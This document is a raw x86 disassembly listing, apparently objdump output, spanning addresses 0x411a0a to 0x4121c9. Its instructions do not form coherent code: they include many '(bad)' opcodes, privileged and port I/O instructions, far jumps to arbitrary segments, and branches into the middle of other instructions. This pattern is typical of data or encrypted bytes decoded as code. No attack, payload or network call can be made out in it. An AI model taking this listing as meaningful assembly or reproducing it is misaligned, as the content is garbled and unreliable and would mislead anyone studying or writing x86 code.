  411a0a:	cmp    DWORD PTR [ebp-0x5dfffb65],edi
  411a10:	and    eax,0xe701beaa
  411a15:	mov    bl,0xc3
  411a17:	sbb    esp,DWORD PTR [ebx+edx*2-0x5c]
  411a1b:	pop    ebx
  411a1c:	jbe    0x411a42
  411a1e:	mul    DWORD PTR [esi]
  411a20:	sbb    DWORD PTR [esi+0x3],esi
  411a23:	test   BYTE PTR [edx+0x0],0x95
  411a27:	xor    eax,0x48de665b
  411a2c:	retf   
  411a2d:	inc    edx
  411a2e:	push   ebp
  411a2f:	adc    ch,BYTE PTR [ebx]
  411a31:	in     al,dx
  411a32:	nop
  411a33:	shr    BYTE PTR [esi],cl
  411a35:	xor    al,0x64
  411a37:	cmc    
  411a38:	aaa    
  411a39:	bound  ebx,QWORD PTR [eax]
  411a3b:	dec    eax
  411a3c:	and    BYTE PTR [edx-0xdb68fd0],bh
  411a42:	pop    ss
  411a43:	and    al,0x70
  411a46:	and    al,0x4f
  411a49:	scas   al,BYTE PTR es:[edi]
  411a4a:	fbstp  TBYTE PTR [ebp-0x4f4b7a09]
  411a50:	jmp    0xb5e2:0xf0db35bf
  411a57:	int    0x47
  411a59:	loope  0x411a22
  411a5b:	into   
  411a5c:	mov    ah,0x57
  411a5e:	xchg   esp,eax
  411a5f:	inc    esi
  411a60:	sub    dh,BYTE PTR [ebx-0x3b]
  411a63:	push   esp
  411a64:	pmaxub mm4,QWORD PTR [ebp+0x0]
  411a68:	inc    ebx
  411a69:	sbb    bl,BYTE PTR [esi+0x11fae792]
  411a6f:	xor    ch,BYTE PTR [edx]
  411a71:	inc    esp
  411a72:	dec    edx
  411a73:	mov    edi,0x7d164608
  411a78:	mov    cl,0x16
  411a7a:	fwait
  411a7b:	arpl   WORD PTR [ebp-0x4],ax
  411a7e:	fist   WORD PTR [ecx+0x521b15ab]
  411a84:	sub    ebp,DWORD PTR [ebx]
  411a86:	mov    al,0xef
  411a88:	or     DWORD PTR ds:0xa5299188,ebx
  411a8e:	mul    ebx
  411a90:	shl    ecx,0xa0
  411a93:	jne    0x411ab2
  411a95:	dec    ebx
  411a96:	fwait
  411a97:	pop    eax
  411a98:	xor    al,0x35
  411a9a:	add    eax,0x32128904
  411a9f:	iret   
  411aa0:	mov    DWORD PTR [esi+0x3e],ebp
  411aa3:	pop    ss
  411aa4:	mov    cl,0xcf
  411aa6:	outs   dx,BYTE PTR ds:[esi]
  411aa7:	adc    edi,0x52d49a8a
  411aad:	mov    ecx,0xed6657a9
  411ab2:	cmc    
  411ab3:	or     BYTE PTR [ebp+0xaad189a],0x7b
  411aba:	add    dh,BYTE PTR [eax]
  411abc:	xchg   esi,eax
  411abd:	and    DWORD PTR [ebp+0x7e],ecx
  411ac0:	pop    ss
  411ac1:	pop    eax
  411ac2:	or     al,0x47
  411ac4:	push   ecx
  411ac5:	and    eax,0x7b6d9254
  411aca:	adc    al,0x5e
  411acc:	sbb    edi,DWORD PTR [eax]
  411ace:	xchg   edx,eax
  411acf:	and    bh,BYTE PTR [ecx-0x4]
  411ad2:	mov    ch,0xb2
  411ad4:	dec    edi
  411ad5:	or     edi,DWORD PTR [ebx]
  411ad7:	mov    dl,0xf9
  411ad9:	sahf   
  411ada:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411adb:	xchg   bl,cl
  411add:	push   ss
  411ade:	int    0xa3
  411ae0:	icebp  
  411ae1:	std    
  411ae2:	gs stos DWORD PTR es:[edi],eax
  411ae4:	or     DWORD PTR [ebx+esi*4-0x6998c1d4],0x45
  411aec:	mov    ch,0xf
  411aee:	push   0x43
  411af0:	mov    ch,0x4a
  411af2:	and    al,0xf3
  411af4:	and    ah,ch
  411af6:	lahf   
  411af7:	stc    
  411af8:	push   0xbe571850
  411afd:	add    dh,ah
  411aff:	mov    edi,edx
  411b01:	cdq    
  411b02:	int3   
  411b03:	xor    edx,esi
  411b05:	adc    DWORD PTR [edx+0x53],ebx
  411b08:	pop    edx
  411b09:	sti    
  411b0a:	dec    esp
  411b0b:	jns    0x411b19
  411b0d:	call   0xabc4:0x48b8b1c0
  411b14:	stc    
  411b15:	sbb    cl,BYTE PTR [ebx+eiz*8-0x1b6e94e]
  411b1c:	lea    esi,[edx]
  411b1e:	dec    edi
  411b1f:	adc    DWORD PTR [ebx],0x1a5c513d
  411b25:	inc    edx
  411b26:	call   0x917a:0x7756dac9
  411b2d:	(bad)
  411b31:	ffreep st(2)
  411b33:	and    edx,DWORD PTR [esi+ebp*1]
  411b36:	imul   eax,DWORD PTR [ebx+0x7e5c319e],0xffffffc2
  411b3d:	push   edi
  411b3e:	mov    ds:0x12b73d00,eax
  411b43:	jne    0x411adb
  411b45:	pusha  
  411b46:	push   ebp
  411b47:	add    ch,BYTE PTR [edi]
  411b49:	inc    esi
  411b4a:	or     al,0x42
  411b4c:	je     0x411b8c
  411b4e:	(bad)  
  411b4f:	and    al,0x86
  411b51:	mov    ds:0xe423d35d,al
  411b56:	mov    es,esp
  411b58:	jmp    0x411b36
  411b5a:	add    BYTE PTR [ecx+ecx*8],dl
  411b5d:	ins    DWORD PTR es:[edi],dx
  411b5e:	ins    DWORD PTR es:[edi],dx
  411b5f:	loop   0x411b9d
  411b61:	or     BYTE PTR [ebx+0x6e0be3a8],cl
  411b67:	sbb    BYTE PTR [ecx+0x35],dl
  411b6a:	xchg   ebx,eax
  411b6b:	push   ds
  411b6c:	mov    ecx,0xb5c6e137
  411b71:	add    BYTE PTR [edi],dh
  411b73:	mov    dl,0xc8
  411b75:	ja     0x411af7
  411b77:	mov    cl,0x2e
  411b79:	mov    al,ds:0x9feecc33
  411b7e:	adc    eax,0x4945403e
  411b83:	test   esp,0xc38689d9
  411b89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b8a:	mov    fs,WORD PTR [ebp+eax*8-0x3fca3cf0]
  411b91:	cmp    ah,cl
  411b93:	je     0x411c00
  411b95:	aas    
  411b96:	push   ebp
  411b97:	test   eax,0xa2d7fb9b
  411b9c:	xchg   ecx,eax
  411b9d:	xor    al,0x3d
  411b9f:	fcmove st,st(4)
  411ba1:	test   BYTE PTR [edx-0x37],bh
  411ba4:	jo     0x411bf0
  411ba6:	cwde   
  411ba7:	sub    eax,0x7f6d0c18
  411bac:	push   0x19
  411bae:	ror    DWORD PTR [ecx+0x11],cl
  411bb1:	shl    DWORD PTR [eax-0x5a],1
  411bb4:	xchg   ebp,eax
  411bb5:	xchg   esp,eax
  411bb6:	leave  
  411bb7:	pop    esi
  411bb8:	cmp    ebx,ebp
  411bba:	shl    DWORD PTR [edi+0x30],cl
  411bbd:	repz jno 0x411b93
  411bc0:	sbb    eax,0x7cbd17f6
  411bc5:	adc    cl,dh
  411bc7:	icebp  
  411bc8:	cld    
  411bc9:	mov    al,ds:0xd4457d5d
  411bce:	std    
  411bcf:	xlat   BYTE PTR ds:[ebx]
  411bd0:	cmp    al,BYTE PTR [ebx+0x64]
  411bd3:	fst    DWORD PTR [ebp+0x44efda97]
  411bd9:	aad    0x47
  411bdb:	fild   WORD PTR [esp+esi*1+0x73055251]
  411be2:	xor    eax,0x73b28e43
  411be7:	jb     0x411b87
  411be9:	sbb    al,0x64
  411beb:	bsf    eax,DWORD PTR [edi]
  411bee:	jae    0x411b88
  411bf0:	popa   
  411bf1:	ja     0x411c51
  411bf3:	mov    cl,0xf7
  411bf5:	lds    ebp,FWORD PTR [ebx+edi*2+0x5f]
  411bf9:	jbe    0x411c15
  411bfb:	mov    eax,0xac45c943
  411c00:	jp     0x411bc9
  411c02:	mov    ecx,0xe0636de
  411c07:	test   ch,cl
  411c09:	scas   eax,DWORD PTR es:[edi]
  411c0a:	aas    
  411c0b:	pop    ebp
  411c0c:	arpl   WORD PTR [ecx],ax
  411c0e:	xchg   eax,ebx
  411c10:	sub    eax,DWORD PTR [ecx-0x19]
  411c13:	out    0xf1,eax
  411c15:	pusha  
  411c16:	pop    es
  411c17:	dec    ecx
  411c18:	fwait
  411c19:	dec    BYTE PTR [edi-0x53a7ac26]
  411c1f:	or     ecx,edx
  411c21:	sbb    BYTE PTR ss:[esi+0x708fb9c],dh
  411c28:	sub    esp,eax
  411c2a:	outs   dx,BYTE PTR ds:[esi]
  411c2b:	ret    0xde2f
  411c2e:	or     BYTE PTR [ebp-0x14],ch
  411c31:	jb     0x411ca5
  411c33:	aas    
  411c34:	mov    eax,0xdfef2155
  411c39:	scas   al,BYTE PTR es:[edi]
  411c3a:	mov    BYTE PTR [eax-0x1fd77c2],cl
  411c40:	mov    edi,esp
  411c42:	loopne 0x411c68
  411c44:	int    0xf5
  411c46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c47:	sbb    eax,0x91c1d6b3
  411c4c:	popf   
  411c4d:	xchg   edx,eax
  411c4e:	add    DWORD PTR [eax-0x62a07975],esp
  411c54:	push   edi
  411c55:	fst    st(7)
  411c57:	enter  0x38e7,0x96
  411c5b:	sar    DWORD PTR [eax-0x2a],0xd7
  411c5f:	dec    ebx
  411c60:	adc    BYTE PTR [ebp-0x37631def],0xd4
  411c67:	cwde   
  411c68:	retf   
  411c69:	jmp    0x8a3d:0xe2b7242c
  411c70:	aam    0x61
  411c72:	xchg   DWORD PTR [esi],ebp
  411c74:	in     al,dx
  411c75:	popf   
  411c76:	sbb    DWORD PTR [ecx],esi
  411c78:	mov    ah,BYTE PTR [eax]
  411c7a:	sbb    BYTE PTR [ebp+0x7e4479aa],dl
  411c80:	(bad)  [ecx+0x136fbcd6]
  411c86:	ret    
  411c87:	or     al,0xd4
  411c89:	add    bl,ch
  411c8b:	mov    ds:0x8a3f117a,eax
  411c90:	push   ds
  411c91:	hlt    
  411c92:	and    BYTE PTR [edx-0x5153083e],0x62
  411c99:	jbe    0x411c88
  411c9b:	and    al,0x90
  411c9d:	inc    eax
  411c9e:	mov    ebp,0x62faf953
  411ca3:	test   eax,0xb0e1ae79
  411ca8:	stos   DWORD PTR es:[edi],eax
  411ca9:	test   BYTE PTR [ebp-0x1cb5e531],dl
  411caf:	rcr    al,1
  411cb1:	jp     0x411cf7
  411cb3:	stos   DWORD PTR es:[edi],eax
  411cb4:	adc    ebx,ebx
  411cb6:	mov    bh,0xe4
  411cb8:	pop    esp
  411cb9:	sbb    DWORD PTR [edx+0x4d],ebp
  411cbc:	xchg   edi,eax
  411cbd:	out    0x59,al
  411cbf:	sbb    eax,0xc01465d5
  411cc4:	adc    dl,BYTE PTR [edi]
  411cc6:	cmp    esp,DWORD PTR [eax+ebp*1]
  411cc9:	ret    
  411cca:	mov    eax,0x5d6b6c05
  411ccf:	pop    esp
  411cd0:	sbb    BYTE PTR [ecx+0x1],dl
  411cd3:	mov    ?,WORD PTR [edx+0x15]
  411cd6:	pop    edi
  411cd7:	pop    esi
  411cd8:	out    0xec,eax
  411cda:	aad    0x27
  411cdc:	scas   eax,DWORD PTR es:[edi]
  411cdd:	mov    edx,0x984567a7
  411ce2:	loope  0x411d41
  411ce4:	into   
  411ce5:	add    dh,bl
  411ce7:	xor    ebp,esi
  411ce9:	cmp    DWORD PTR [ebx],edi
  411ceb:	into   
  411cec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ced:	stos   BYTE PTR es:[edi],al
  411cee:	xchg   esi,eax
  411cef:	ins    DWORD PTR es:[edi],dx
  411cf0:	rol    DWORD PTR [eax],0x11
  411cf3:	ins    BYTE PTR es:[edi],dx
  411cf4:	mov    edi,0x9a978a40
  411cf9:	es neg esp
  411cfc:	loope  0x411d50
  411cfe:	xor    eax,0x62e730bd
  411d03:	xchg   edx,eax
  411d04:	daa    
  411d05:	sbb    al,0xfa
  411d07:	test   eax,esi
  411d09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d0a:	ficomp DWORD PTR [eax]
  411d0c:	fbld   TBYTE PTR [eax+0x56]
  411d0f:	pop    edi
  411d10:	pop    edx
  411d11:	mov    fs,WORD PTR [edx-0x19]
  411d14:	clc    
  411d15:	mov    dl,0x8c
  411d17:	mov    ds:0xacd91dde,eax
  411d1c:	rcr    DWORD PTR [esi-0x44],1
  411d1f:	ret    
  411d20:	bnd jp 0x411d53
  411d23:	shl    BYTE PTR [eax+0x14],0xb4
  411d27:	repz dec ebp
  411d29:	push   edi
  411d2a:	push   cs
  411d2b:	xchg   ebp,eax
  411d2c:	das    
  411d2d:	xchg   BYTE PTR [ebx+0x32],ah
  411d30:	inc    edx
  411d31:	dec    ecx
  411d32:	scas   al,BYTE PTR es:[edi]
  411d33:	inc    esi
  411d34:	mov    cl,0x36
  411d36:	jo     0x411d29
  411d38:	pop    esp
  411d39:	mov    ecx,0x7fd55e2
  411d3e:	jmp    FWORD PTR fs:[ebp+0x2c]
  411d42:	jns    0x411d43
  411d44:	inc    esi
  411d45:	cmc    
  411d46:	push   eax
  411d47:	addr16 retf 
  411d49:	loop   0x411ccd
  411d4b:	ins    DWORD PTR es:[edi],dx
  411d4c:	and    DWORD PTR [edx-0x19ac5c40],edx
  411d52:	xor    eax,0x2a953ec7
  411d57:	lds    ebp,FWORD PTR [ecx+0x16d68838]
  411d5d:	fisubr DWORD PTR [esp+ecx*4]
  411d61:	sti    
  411d62:	xor    eax,0x8e989651
  411d67:	arpl   WORD PTR [ecx-0x3f],bx
  411d6a:	jae    0x411dde
  411d6c:	and    al,0xf0
  411d6e:	mov    esi,0xbd175973
  411d73:	dec    ecx
  411d74:	(bad)  
  411d75:	es dec ebx
  411d77:	imul   edx,DWORD PTR [esi+0x72],0xffffffb5
  411d7b:	dec    ebx
  411d7c:	adc    eax,0x598d14ab
  411d81:	mov    ds:0x17102f48,al
  411d86:	outs   dx,DWORD PTR ds:[esi]
  411d87:	mov    al,0xcf
  411d89:	in     eax,dx
  411d8a:	ror    DWORD PTR [ecx+0xf],1
  411d8d:	retf   0xe950
  411d90:	inc    edi
  411d91:	scas   al,BYTE PTR es:[edi]
  411d92:	clc    
  411d93:	cmp    ebp,DWORD PTR [eax]
  411d95:	ins    BYTE PTR es:[edi],dx
  411d96:	adc    DWORD PTR [edi-0x2b4cfd0d],esi
  411d9c:	cmp    DWORD PTR [ebp-0x717f554e],ecx
  411da2:	nop
  411da3:	inc    esi
  411da4:	test   esi,edx
  411da6:	int3   
  411da7:	and    eax,0x54bfc564
  411dac:	cs cmp eax,0x6ca32b1d
  411db2:	jae    0x411df1
  411db4:	and    ch,BYTE PTR [esi-0x48]
  411db7:	ss push eax
  411db9:	add    ebx,DWORD PTR [ebx+0x11dcaf77]
  411dbf:	add    DWORD PTR [ebx+0x6ac96391],0x8e132058
  411dc9:	cld    
  411dca:	sub    BYTE PTR [edi+0x53],ah
  411dcd:	sub    eax,0x3fc0fc85
  411dd2:	in     al,0x2a
  411dd4:	and    BYTE PTR [edi-0x13561bbc],dh
  411dda:	leave  
  411ddb:	sbb    edi,eax
  411ddd:	call   0xb5797c07
  411de2:	push   edi
  411de3:	nop
  411de4:	stos   BYTE PTR es:[edi],al
  411de5:	mov    ds:0xbe5443df,eax
  411dea:	outs   dx,BYTE PTR ds:[esi]
  411deb:	or     BYTE PTR [eax],0xeb
  411dee:	cld    
  411def:	dec    eax
  411df0:	mov    eax,0xe288f2aa
  411df5:	mov    al,ds:0xb37a6638
  411dfa:	aaa    
  411dfb:	add    edx,edi
  411dfd:	mov    esi,0x8ce3df94
  411e02:	xor    ah,BYTE PTR [esi+0x3265b56f]
  411e08:	push   es
  411e09:	pop    ss
  411e0a:	dec    ecx
  411e0b:	mov    dh,0xad
  411e0d:	push   edi
  411e0e:	mov    ebp,0x4fc22632
  411e13:	push   ebp
  411e14:	pop    ecx
  411e15:	xor    eax,0x2c5b901a
  411e1a:	aad    0x52
  411e1c:	mov    ebp,0x4b752d74
  411e21:	lea    esi,[esi-0x5fce4de0]
  411e27:	cwde   
  411e28:	mov    esp,0xb9dbaf8e
  411e2d:	xor    ch,ah
  411e2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e30:	call   0x374f:0x34fd3a50
  411e37:	cwde   
  411e38:	xchg   ebp,eax
  411e39:	les    ebp,FWORD PTR [edx+edx*1+0xc]
  411e3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e3e:	push   esi
  411e3f:	pop    esp
  411e40:	xlat   BYTE PTR ds:[ebx]
  411e41:	pop    ds
  411e42:	ja     0x411e22
  411e44:	std    
  411e45:	adc    DWORD PTR [esi],esp
  411e47:	dec    edi
  411e48:	xchg   esi,eax
  411e49:	cmp    eax,0x4be44147
  411e4e:	dec    esp
  411e4f:	jmp    0x955c:0x9ac7eadc
  411e56:	fsub   st(3),st
  411e58:	sub    eax,0xf317ace1
  411e5d:	sub    al,0xaf
  411e5f:	js     0x411e63
  411e61:	retf   0x8960
  411e64:	mov    ah,0x96
  411e66:	arpl   si,di
  411e68:	lods   al,BYTE PTR ds:[esi]
  411e69:	add    ebp,ebp
  411e6b:	es lock and eax,0x39bfe646
  411e72:	xor    ch,al
  411e74:	mov    edi,0x17a7db53
  411e79:	outs   dx,DWORD PTR ds:[esi]
  411e7a:	pusha  
  411e7b:	popa   
  411e7c:	inc    esi
  411e7d:	pop    es
  411e7e:	inc    bh
  411e80:	in     al,dx
  411e81:	mov    ebp,0x65588c11
  411e86:	cmp    dh,BYTE PTR [ebp-0x6953748e]
  411e8c:	fbstp  TBYTE PTR [ebx+0x80405d3]
  411e92:	ds scas al,BYTE PTR es:[edi]
  411e94:	push   cs
  411e95:	pop    ss
  411e96:	bound  edx,QWORD PTR [edx]
  411e98:	push   edx
  411e99:	add    dl,dh
  411e9b:	and    al,0x77
  411e9d:	repnz push 0xffffffff
  411ea0:	in     al,dx
  411ea1:	aad    0x7c
  411ea3:	add    ebx,DWORD PTR [edi]
  411ea5:	rcr    BYTE PTR ds:0x847149c8,cl
  411eab:	icebp  
  411eac:	ss cmp al,0xa2
  411eaf:	sub    ebx,DWORD PTR [edx+0x1687bce1]
  411eb5:	imul   edi,ecx,0x42
  411eb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411eb9:	inc    DWORD PTR [esi+0x5b0e4148]
  411ebf:	out    dx,eax
  411ec0:	mov    al,ds:0x5ecdb2a8
  411ec5:	(bad)  
  411ec6:	pop    ecx
  411ec7:	fbld   TBYTE PTR [esi+0x6e]
  411eca:	mov    ch,0x2b
  411ecc:	sub    BYTE PTR [edx-0x52acb178],dh
  411ed2:	mov    cl,0x38
  411ed4:	push   ss
  411ed5:	sbb    dl,BYTE PTR [edi+eax*2+0xd]
  411ed9:	jge    0x411ea2
  411edb:	cwde   
  411edc:	dec    ebp
  411edd:	mov    edi,0xf1b73197
  411ee2:	xchg   DWORD PTR [edx+0x2674ce49],eax
  411ee8:	sbb    eax,edi
  411eea:	dec    ecx
  411eeb:	cmp    BYTE PTR [edi],0x96
  411eee:	inc    ecx
  411eef:	cmp    eax,ebp
  411ef1:	(bad)  
  411ef2:	cwde   
  411ef3:	xor    al,0xb3
  411ef5:	fwait
  411ef6:	pop    edx
  411ef7:	popa   
  411ef8:	retf   
  411ef9:	nop
  411efa:	lods   al,BYTE PTR ds:[esi]
  411efb:	loop   0x411eae
  411efd:	push   esp
  411efe:	sub    DWORD PTR [edx],eax
  411f00:	inc    ebp
  411f01:	push   edx
  411f02:	or     BYTE PTR [edx],ch
  411f04:	fidiv  DWORD PTR [ebp-0x59]
  411f07:	std    
  411f08:	imul   edi,DWORD PTR [esi+ecx*1],0xb
  411f0c:	adc    DWORD PTR [edx],0xff7d72f6
  411f12:	mov    ebx,gs
  411f14:	mov    ch,0x51
  411f16:	sub    esp,DWORD PTR [edx+0x3c]
  411f19:	out    0xb7,al
  411f1b:	sbb    eax,0xa1c6c77d
  411f20:	sub    edx,edx
  411f22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f23:	mov    edi,DWORD PTR [eax+0x47]
  411f26:	ret    
  411f27:	lods   al,BYTE PTR ds:[esi]
  411f28:	icebp  
  411f29:	mov    dh,0xe4
  411f2b:	or     DWORD PTR [esi+esi*2-0x10],eax
  411f2f:	call   0x87c6f095
  411f34:	jp     0x411f99
  411f36:	sub    esi,eax
  411f38:	mov    edi,0x8770f1e3
  411f3d:	cmp    DWORD PTR [edi+0xe571312],ebx
  411f43:	lock or DWORD PTR [ebx-0x44c30362],ebx
  411f4a:	js     0x411fbb
  411f4c:	jno    0x411f80
  411f4e:	(bad)  
  411f50:	inc    esi
  411f51:	jnp    0x411f4f
  411f53:	loop   0x411fb3
  411f55:	mov    al,0x8c
  411f57:	inc    ebp
  411f58:	mov    ecx,0x35e8753a
  411f5d:	sbb    eax,0x80c7a998
  411f62:	sub    al,0x65
  411f64:	ret    
  411f65:	mov    ch,0x54
  411f67:	mov    esi,0x12ada205
  411f6c:	lods   al,BYTE PTR ds:[esi]
  411f6d:	aam    0x79
  411f6f:	call   0xcd753619
  411f74:	sub    BYTE PTR [ecx],bh
  411f76:	and    eax,0xa1b02f64
  411f7b:	and    ch,BYTE PTR [ebp+ebp*1+0x57607bba]
  411f82:	call   0x29692b1b
  411f87:	pavgb  mm3,QWORD PTR [eax]
  411f8a:	icebp  
  411f8b:	sub    al,0x90
  411f8d:	sub    al,0x99
  411f8f:	jle    0x411f84
  411f91:	retf   
  411f92:	pop    edx
  411f93:	imul   ecx,ecx,0x66e8d712
  411f99:	add    bh,ch
  411f9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f9c:	dec    esp
  411f9d:	and    esi,esp
  411f9f:	int3   
  411fa0:	or     al,0x21
  411fa2:	popa   
  411fa3:	mov    cl,0x7e
  411fa5:	clc    
  411fa6:	sub    al,0xd7
  411fa8:	stc    
  411fa9:	in     eax,0x4c
  411fab:	scas   al,BYTE PTR es:[edi]
  411fac:	push   ecx
  411fad:	cmp    ecx,DWORD PTR [ebx+0x2ce979c8]
  411fb3:	sub    DWORD PTR [edx-0x1547b5fa],eax
  411fb9:	sub    BYTE PTR [ebx-0x48],al
  411fbc:	lods   eax,DWORD PTR ds:[esi]
  411fbd:	lahf   
  411fbe:	or     eax,0xaf122de5
  411fc3:	neg    BYTE PTR [edi+0x41]
  411fc6:	js     0x411fc4
  411fc8:	ja     0x411fd2
  411fca:	jp     0x411f6b
  411fcc:	cmp    al,0x36
  411fce:	sar    BYTE PTR [eax],cl
  411fd0:	(bad)  
  411fd2:	jp     0x412002
  411fd4:	pushf  
  411fd5:	imul   esp,DWORD PTR [ebx],0x3f
  411fd8:	xchg   BYTE PTR [ebp-0x64efd2e2],dh
  411fde:	pop    eax
  411fdf:	jle    0x411fad
  411fe1:	push   eax
  411fe2:	adc    DWORD PTR ds:0xfa5f8c0,ebx
  411fe8:	fistp  WORD PTR [ecx+0x14]
  411feb:	or     al,0xe
  411fed:	rdpmc  
  411fef:	jnp    0x412017
  411ff1:	cmp    BYTE PTR [ebp+0x13],al
  411ff4:	repz cmp eax,0xcf8749a1
  411ffa:	mov    ?,WORD PTR ds:0xe526b54d
  412000:	mov    WORD PTR [ecx+0x43877008],?
  412006:	aas    
  412007:	dec    esi
  412008:	clc    
  412009:	rcr    DWORD PTR [ebx-0x27],0x15
  41200d:	jb     0x412013
  41200f:	cwde   
  412010:	test   cl,0x85
  412013:	sub    dl,BYTE PTR [ebp+eax*4-0x76f5cd5e]
  41201a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41201b:	out    0x12,eax
  41201d:	and    BYTE PTR fs:[ecx+edi*2+0x6023fad0],cl
  412025:	sub    al,0x43
  412027:	sub    dh,BYTE PTR [ebx+0x7f38bd8c]
  41202d:	mov    dh,0xc7
  41202f:	inc    ecx
  412030:	lds    esi,FWORD PTR [edx]
  412032:	cmc    
  412033:	cmp    eax,0xb99320fe
  412038:	rcl    DWORD PTR [edx],0xfb
  41203b:	das    
  41203c:	or     dh,al
  41203e:	jae    0x41200e
  412040:	or     al,0x69
  412042:	mov    al,0x11
  412044:	jbe    0x41205a
  412046:	xchg   ecx,eax
  412047:	int    0xe5
  412049:	jmp    0x41203b
  41204b:	jl     0x411fe6
  41204d:	scas   eax,DWORD PTR es:[edi]
  41204e:	jl     0x412005
  412050:	dec    eax
  412051:	imul   esi,DWORD PTR [edx+edx*4+0x50],0xb
  412056:	addr16 into 
  412058:	pop    es
  412059:	xor    bl,BYTE PTR [edi-0x3c]
  41205c:	iret   
  41205d:	adc    BYTE PTR [esi+edx*1+0x2931dfbc],dl
  412064:	daa    
  412065:	adc    BYTE PTR [ebp-0x5fa3b628],bh
  41206b:	retf   
  41206c:	xchg   edi,eax
  41206d:	add    eax,0x90fa599c
  412072:	dec    edi
  412073:	adc    dl,bh
  412075:	mov    dh,0xbe
  412077:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412078:	fwait
  412079:	bound  esi,QWORD PTR [ecx]
  41207b:	mov    esp,0xa9a51556
  412080:	scas   al,BYTE PTR es:[edi]
  412081:	mov    ds:0x48a9fc3f,al
  412086:	sbb    eax,DWORD PTR [esi+edi*8]
  412089:	mov    esp,DWORD PTR [ecx-0x9]
  41208c:	int    0xb
  41208e:	icebp  
  41208f:	mov    ?,edx
  412091:	or     BYTE PTR [eax+0x72],al
  412094:	add    eax,0xbe8c75b6
  412099:	xchg   edi,eax
  41209a:	(bad)  
  41209b:	dec    eax
  41209c:	mov    dh,0xba
  41209e:	pop    di
  4120a0:	cmp    eax,0xa614f93e
  4120a5:	std    
  4120a6:	hlt    
  4120a7:	sub    DWORD PTR [esi],ebp
  4120a9:	xchg   edi,eax
  4120aa:	rcr    BYTE PTR [esi-0x10],cl
  4120ad:	cmp    esp,ecx
  4120af:	enter  0x9c28,0x8e
  4120b3:	cmp    eax,0x5925f481
  4120b8:	nop
  4120b9:	into   
  4120ba:	and    DWORD PTR [ecx+0x69409673],0x338b9f2c
  4120c4:	mov    ch,0x1e
  4120c6:	ret    0x25b8
  4120c9:	hlt    
  4120ca:	ret    
  4120cb:	sahf   
  4120cc:	adc    BYTE PTR [ebx+0x1c],dl
  4120cf:	shl    edi,cl
  4120d1:	call   0xdf83:0x5ceac29e
  4120d8:	xchg   ebp,eax
  4120d9:	add    BYTE PTR [edi],bh
  4120db:	adc    DWORD PTR [edi],0x6135b055
  4120e1:	aaa    
  4120e2:	popa   
  4120e3:	xor    ebp,DWORD PTR [ebp+eax*1-0x10]
  4120e7:	nop
  4120e8:	ret    
  4120e9:	ds cld 
  4120eb:	inc    esi
  4120ec:	cwde   
  4120ed:	pop    ecx
  4120ee:	and    BYTE PTR [ebp+esi*1+0x25],0x78
  4120f3:	das    
  4120f4:	lea    esp,[ebp-0x28]
  4120f7:	pushf  
  4120f8:	dec    edx
  4120f9:	cli    
  4120fa:	add    eax,0x81053354
  4120ff:	pop    esi
  412100:	in     eax,0xda
  412102:	(bad)
  412106:	test   eax,0x5a62a6ea
  41210c:	das    
  41210d:	inc    edi
  41210e:	adc    al,BYTE PTR [esi-0x54]
  412111:	cli    
  412112:	loopne 0x41209c
  412114:	daa    
  412115:	pop    ebp
  412116:	cmc    
  412117:	lock push ebx
  412119:	popf   
  41211a:	xor    DWORD PTR ds:0x8f680869,esp
  412120:	jg     0x412149
  412122:	leave  
  412123:	ins    DWORD PTR es:[edi],dx
  412124:	sti    
  412125:	xchg   edi,eax
  412126:	arpl   WORD PTR [ebx-0x3],bp
  412129:	jnp    0x41219b
  41212b:	or     al,bh
  41212d:	mov    esi,0xd4d3678b
  412132:	addr16 adc dl,bl
  412135:	jbe    0x41212a
  412137:	or     BYTE PTR [ecx+ebx*4],0xdc
  41213b:	add    DWORD PTR [edi],edi
  41213d:	inc    ecx
  41213e:	aam    0x43
  412140:	jns    0x41217b
  412142:	xor    esp,DWORD PTR [ecx-0x7d]
  412145:	or     BYTE PTR [edx+0x209baaa7],ah
  41214b:	rcl    DWORD PTR [esi-0x1c],0xdb
  41214f:	cwde   
  412150:	cmp    cl,bl
  412152:	gs inc esp
  412154:	adc    BYTE PTR [ebx-0x4b],bh
  412157:	shr    BYTE PTR [edx+0x52],cl
  41215a:	js     0x41212b
  41215c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41215d:	inc    ebx
  41215e:	jmp    DWORD PTR [ecx+eax*8-0x250e47fd]
  412165:	ss push ebx
  412167:	mov    ecx,0x1e627fba
  41216c:	inc    edx
  41216d:	inc    eax
  41216e:	cdq    
  41216f:	fmul   st(5),st
  412171:	test   BYTE PTR [eax-0x78],bh
  412174:	sbb    DWORD PTR [eax],esp
  412176:	pop    edi
  412177:	mov    BYTE PTR [edx],ch
  412179:	adc    ah,al
  41217b:	mov    DWORD PTR [ecx],esi
  41217d:	and    ah,BYTE PTR [ecx-0x50]
  412180:	aaa    
  412181:	aas    
  412182:	add    al,0xad
  412184:	jmp    0x4121c4
  412186:	inc    esi
  412187:	jae    0x4121aa
  412189:	(bad)  
  41218b:	pusha  
  41218c:	jmp    0xa9949f1
  412191:	pop    esp
  412192:	aam    0x94
  412194:	inc    edi
  412195:	test   BYTE PTR [edi+0x39],ch
  412198:	dec    ecx
  412199:	cs faddp st(6),st
  41219c:	or     al,0x35
  41219e:	repnz adc al,BYTE PTR [esi]
  4121a1:	outs   dx,BYTE PTR ds:[esi]
  4121a2:	mov    ebx,DWORD PTR [edx-0x402f3608]
  4121a8:	js     0x412181
  4121aa:	push   eax
  4121ab:	mov    ebx,0x9e0a7908
  4121b0:	out    0xbc,al
  4121b2:	or     BYTE PTR ds:0x91a3a7de,bh
  4121b8:	test   eax,0xe102618
  4121bd:	lods   al,BYTE PTR ds:[esi]
  4121be:	add    al,BYTE PTR [ebp+0x7ebdb89c]
  4121c4:	mov    ebp,0x4230c996
  4121c9:	sahf   
